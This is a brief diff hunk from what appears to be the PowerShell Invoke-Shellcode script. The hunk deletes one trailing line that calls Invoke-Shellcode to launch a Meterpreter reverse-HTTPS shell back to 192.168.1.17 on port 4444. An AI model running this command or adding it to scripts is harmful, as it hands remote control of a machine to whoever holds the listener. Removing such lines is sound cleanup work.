@@ -772,4 +772,3 @@ http://www.exploit-monday.com
 
     }   
 }
-Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.17 -Lport 4444 -Force
